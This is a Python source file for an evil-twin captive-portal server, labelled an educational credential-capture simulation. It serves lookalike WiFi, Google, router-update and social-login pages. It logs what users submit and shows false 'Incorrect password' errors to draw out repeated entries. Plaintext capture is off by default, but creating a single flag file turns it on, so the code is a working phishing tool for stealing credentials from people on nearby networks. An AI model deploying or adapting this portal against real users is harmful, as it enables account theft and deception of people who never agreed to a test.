#!/usr/bin/env python3
# ACID Captive Portal Lab - captive portal web server (stdlib only).
# Educational rogue-AP credential-capture SIMULATION. SAFE BY DEFAULT:
#   raw submitted values are NOT stored - only a masked submission count + field names.
#   To enable raw capture for AUTHORIZED OWN-LAB testing ONLY, create the flag file
#   /tmp/acid_portal_capture (the launcher creates it after an explicit lab-mode confirm).
# Config (written by the TFT / launcher, read live each request):
#   /tmp/acid_portal_ssid        - SSID shown on the page
#   /tmp/acid_portal_template    - template key: wifi | google | router | social
#   /tmp/acid_portal_attempts    - how many submit attempts before the "success" page
#   /tmp/acid_portal_passthrough - "1" = after success, release the client to real internet
#   /tmp/acid_portal_capture     - present = raw capture ON (own-lab only); absent = masked
# Log -> /tmp/acid_portal_creds.log ; clients -> /tmp/acid_portal_clients
import os, time, html, urllib.parse, subprocess, threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

GW = '10.0.0.1'
SSID_FILE = '/tmp/acid_portal_ssid'
TPL_FILE = '/tmp/acid_portal_template'
ATT_FILE = '/tmp/acid_portal_attempts'
PASS_FILE = '/tmp/acid_portal_passthrough'
CRED_LOG = '/tmp/acid_portal_creds.log'
CLIENT_LOG = '/tmp/acid_portal_clients'
CAPTURE_FLAG = '/tmp/acid_portal_capture'   # present = raw capture ON (authorized own-lab only)

def raw_capture():
    # SAFE DEFAULT: off. Raw values stored ONLY when the launcher has written the lab-mode flag.
    return os.path.exists(CAPTURE_FLAG)

_attempts = {}          # client_ip -> count
_lock = threading.Lock()

def _rd(f, d=''):
    try:
        return open(f).read().strip()
    except Exception:
        return d
def ssid():
    return _rd(SSID_FILE, 'WiFi') or 'WiFi'
def tpl():
    return _rd(TPL_FILE, 'wifi') or 'wifi'
def max_att():
    try:
        return max(1, int(_rd(ATT_FILE, '1')))
    except Exception:
        return 1
def passthrough():
    return _rd(PASS_FILE, '0') == '1'

# template registry: title, intro, fields [(name,label,type,placeholder)], button label
TEMPLATES = {
 'wifi':   {'t': 'Sign in to {s}',        'i': 'This network requires authentication. Enter the WiFi password to continue.',
            'f': [('password', 'Network password', 'password', 'Enter the WiFi password')], 'b': 'Connect'},
 'google': {'t': 'Sign in',               'i': 'Use your Google Account to continue to {s} WiFi.',
            'f': [('email', 'Email', 'text', 'Email or phone'), ('password', 'Password', 'password', 'Enter your password')], 'b': 'Next'},
 'router': {'t': 'Router Authentication', 'i': 'A firmware update is available for {s}. Confirm the WiFi password to install.',
            'f': [('password', 'WiFi / Admin password', 'password', 'Enter password')], 'b': 'Update'},
 'social': {'t': 'Log in to continue',    'i': 'Log in to get free internet on {s}.',
            'f': [('email', 'Email or phone', 'text', 'Email or phone'), ('password', 'Password', 'password', 'Password')], 'b': 'Log In'},
}

CSS = '''*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
body{margin:0;background:#0b1220;color:#e8eef7;display:flex;min-height:100vh;align-items:center;justify-content:center;padding:18px}
.card{width:100%;max-width:390px;background:#121a2b;border:1px solid #22304a;border-radius:16px;padding:28px 22px;box-shadow:0 12px 44px #0009}
.lk{width:48px;height:48px;border-radius:13px;background:#159a55;display:flex;align-items:center;justify-content:center;margin-bottom:16px}
.lk svg{width:24px;height:24px;fill:#eafff2}
h1{font-size:20px;margin:0 0 5px;font-weight:700}
p{font-size:13.5px;color:#9fb0c8;margin:0 0 20px;line-height:1.55}
label{font-size:12px;color:#9fb0c8;display:block;margin:0 0 7px}
input{width:100%;padding:14px;border-radius:11px;border:1px solid #2a3a55;background:#0c1322;color:#fff;font-size:16px;margin:0 0 18px;outline:none}
input:focus{border-color:#159a55}
button{width:100%;padding:15px;border:0;border-radius:11px;background:#17a85a;color:#02160c;font-weight:700;font-size:15px}
.err{background:#3a1620;border:1px solid #864048;color:#ff9aa8;padding:11px 12px;border-radius:9px;font-size:13px;margin:0 0 16px}
.ft{margin-top:18px;font-size:11px;color:#56688a;text-align:center}'''

LOCK_SVG = '<svg viewBox="0 0 24 24"><path d="M12 1 3 5v6c0 5 3.8 9.7 9 11 5.2-1.3 9-6 9-11V5l-9-4zm0 6a2.5 2.5 0 0 1 2.5 2.5c0 1-.6 1.9-1.5 2.3V15h-2v-3.2c-.9-.4-1.5-1.3-1.5-2.3A2.5 2.5 0 0 1 12 7z"/></svg>'

def page(body):
    return '<!doctype html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><title>%s</title><style>%s</style></head><body><div class=card>%s</div></body></html>' % (html.escape(ssid()), CSS, body)

def form_page(err=''):
    t = TEMPLATES.get(tpl(), TEMPLATES['wifi'])
    s = html.escape(ssid())
    fields = ''
    for nm, lb, ty, ph in t['f']:
        fields += '<label>%s</label><input name="%s" type="%s" placeholder="%s" autocomplete="off" required>' % (html.escape(lb), nm, ty, html.escape(ph))
    e = '<div class=err>%s</div>' % html.escape(err) if err else ''
    body = ('<div class=lk>%s</div><h1>%s</h1><p>%s</p><form method=POST action=/login>%s%s<button type=submit>%s</button></form><div class=ft>Authentication required to access this network.</div>'
            % (LOCK_SVG, html.escape(t['t'].format(s=s)), html.escape(t['i'].format(s=s)), e, fields, html.escape(t['b'])))
    return page(body)

def success_page():
    s = html.escape(ssid())
    body = ('<div class=lk style="background:#17a85a">%s</div><h1>You\'re connected</h1><p>You are now signed in to %s. You can return to your browser.</p><div class=ft>Connection secured.</div>'
            % (LOCK_SVG, s))
    return page(body)

def authorize(ip):
    if not passthrough():
        return
    try:
        subprocess.run(['ipset', 'add', 'acid_authed', ip], stderr=subprocess.DEVNULL, timeout=3)
    except Exception:
        pass

class H(BaseHTTPRequestHandler):
    protocol_version = 'HTTP/1.1'
    def log_message(self, *a):
        pass
    def _send(self, body, code=200, ctype='text/html; charset=utf-8'):
        b = body.encode('utf-8', errors='replace')
        try:
            self.send_response(code)
            self.send_header('Content-Type', ctype)
            self.send_header('Content-Length', str(len(b)))
            self.send_header('Cache-Control', 'no-store')
            self.send_header('Connection', 'close')
            self.end_headers()
            self.wfile.write(b)
        except Exception:
            pass
    def _redirect(self):
        try:
            self.send_response(302)
            self.send_header('Location', 'http://%s/' % GW)
            self.send_header('Content-Length', '0')
            self.send_header('Connection', 'close')
            self.end_headers()
        except Exception:
            pass
    def _logclient(self):
        try:
            open(CLIENT_LOG, 'a').write('%d %s\n' % (int(time.time()), self.client_address[0]))
        except Exception:
            pass
    def do_GET(self):
        p = self.path.lower()
        self._logclient()
        if p in ('/generate_204', '/gen_204') or 'ncsi.txt' in p or 'connecttest' in p:
            self._redirect(); return
        self._send(form_page())
    def do_POST(self):
        ip = self.client_address[0]
        try:
            ln = int(self.headers.get('Content-Length') or 0)
        except Exception:
            ln = 0
        raw = self.rfile.read(ln).decode('utf-8', errors='replace') if ln else ''
        f = urllib.parse.parse_qs(raw)
        with _lock:
            n = _attempts.get(ip, 0) + 1
            _attempts[ip] = n
        # SAFE BY DEFAULT: never store submitted values - only field names + a masked count.
        # Raw values are recorded ONLY when the operator has explicitly enabled own-lab mode.
        if raw_capture():
            rec = ' '.join('%s=%s' % (k, (v[0] if v else '')) for k, v in f.items())
        else:
            rec = 'fields=[%s] values=MASKED (demo capture off)' % ','.join(f.keys())
        try:
            open(CRED_LOG, 'a').write('%s | %s | tpl=%s att=%d | %s\n' % (time.strftime('%H:%M:%S'), ip, tpl(), n, rec))
        except Exception:
            pass
        if n >= max_att():
            authorize(ip)
            self._send(success_page())
        else:
            self._send(form_page(err='Incorrect password. Please check and try again.'))

def main():
    srv = ThreadingHTTPServer(('0.0.0.0', 80), H)
    srv.daemon_threads = True
    srv.serve_forever()

if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        try:
            open('/tmp/acid_portal.log', 'a').write('SERVER ERR %s\n' % e)
        except Exception:
            pass
